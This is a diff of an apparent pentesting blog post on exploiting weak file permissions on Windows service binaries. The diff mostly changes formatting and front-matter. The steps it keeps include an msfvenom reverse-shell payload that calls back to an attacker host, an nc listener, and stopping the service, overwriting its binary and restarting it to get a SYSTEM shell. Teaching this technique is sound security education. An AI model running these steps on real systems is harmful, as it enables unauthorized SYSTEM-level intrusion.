@@ -1,26 +1,36 @@
 ---
 title: Permissive File System ACLs
 date: 2026-06-19 18:13:01
+
 categories:
   - Active Directory
   - Windows
   - Post-Exploitation
   - Windows Privesc
   - Services
+
 tags:
-  - msfvenom
-  - Weak-ACL
-  - AccessChk
-  - icacls
   - Permissive-File-System-ACLs
   - Modifiable-Service-Binary
+  - Weak-ACL
   - Service-Binary-Replacement
+  - icacls
+  - AccessChk
   - SharpUp
+  - msfvenom
   - sc.exe
   - Windows-Services
+cover: /img/permissive-file-system-acl.png
+top_img: /img/bg-img.jpg
+description: Identify and exploit permissive file system ACLs on Windows service binaries to replace the executable, restart the service, and execute arbitrary code as SYSTEM for privilege escalation.
 ---
 
-> ➜ Permissive File System ACLs occur when a low-privileged user has `write` or `full control` permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically `SYSTEM`.
+
+
+
+> ➜ Permissive File System ACLs occur when a low-privileged user has `write` or `full control` permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service's account, typically `SYSTEM`.
+
+
 
 # Enumeration
 
@@ -57,10 +67,10 @@ C:\Program Files\service-name\service-name.exe BUILTIN\Users:(I)(F)
 
 #### Checking the Service Account
 
-> ➜ We check the service account with `sc qc`.
->
->   * `SERVICE_START_NAME : LocalSystem` confirms our payload will run as `SYSTEM`.
->
+> ➜ We check the service account with `sc qc`. 
+> 
+> - `SERVICE_START_NAME : LocalSystem` confirms our payload will run as `SYSTEM`.
+ 
 
 ```powershell
 PS C:\> sc.exe qc service-name
@@ -74,6 +84,7 @@ PS C:\> sc.exe qc service-name
     SERVICE_START_NAME : LocalSystem
 ```
 
+
 # Exploitation
 
 #### Generating the Malicious Binary
@@ -86,13 +97,14 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-
 
 #### Starting the Listener
 
+
 ```bash
 rlwrap nc -lvnp port
 ```
 
 #### Checking If We Can Start And Stop the Service
 
-> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires `SERVICE_STOP` to stop it and `SERVICE_START` to start it again.
+>  ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires `SERVICE_STOP` to stop it and `SERVICE_START` to start it again.
 
 ```bash
 PS C:\> .\accesschk.exe /accepteula -uvqc SecurityService
@@ -113,6 +125,7 @@ SecurityService
         SERVICE_STOP
 ```
 
+
 #### Stop the Service
 
 ```powershell
@@ -121,7 +134,7 @@ C:\> sc stop SecurityService
 
 #### Replacing the Service Binary
 
-> ➜ The service is `Stopped`, so we can overwrite the file directly.
+> ➜ The service is `Stopped`, so we can overwrite the file directly. 
 
 ```powershell
 C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
@@ -134,6 +147,7 @@ C:\> sc start SecurityService
 ```
 
 #### Getting a SYSTEM Shell
+
 
 ```bash
 ➜  weak-permissions rlwrap nc -lvnp 8888
